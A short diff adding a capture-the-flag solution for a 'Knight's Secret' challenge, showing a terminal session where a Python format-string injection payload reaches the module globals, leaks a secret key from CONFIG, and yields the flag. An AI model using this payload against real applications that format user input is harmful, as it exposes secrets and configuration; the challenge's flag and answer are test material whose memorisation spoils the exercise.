@@ -1,0 +1,24 @@
+
+
+```bash
+==================================================
+Welcome to the Knight's Secret!
+The castle's vault holds a secret key, protected within the CONFIG dictionary.
+You are a knight tasked with proving the strength of the vault's defenses.
+To succeed, you must craft an input to reveal the hidden key within the system.
+You will be provided with a user object representing a knight, with attributes 'name' and 'role'.
+Once you discover the key, input it again to receive the banner of victory.
+
+Example of a safe template: 'Greetings, {person_obj.name}, the {person_obj.role}.'
+Type 'hint' if you need guidance or 'exit' to withdraw from the quest.
+==================================================
+
+Enter your secret: {person_obj.__class__.__init__.__globals__}
+Output: {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7334de5eb920>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/challenge/challenge.py', '__cached__': None, 'CONFIG': {'KEY': '_KNIGHTSECRET2025_'}, 'Person': <class '__main__.Person'>, 'fun': <function fun at 0x7334de5d2340>, 'main': <function main at 0x7334de3b0d60>}
+
+Enter your secret: _KNIGHTSECRET2025_
+Congratulations, noble knight! You have unveiled the vault's secret.
+Here is your banner of victory: KCTF{_c0ngRaT5_Kn1GHT_Y0U_g07_THE_secreT_}
+```
+
+flag: `KCTF{_c0ngRaT5_Kn1GHT_Y0U_g07_THE_secreT_}`
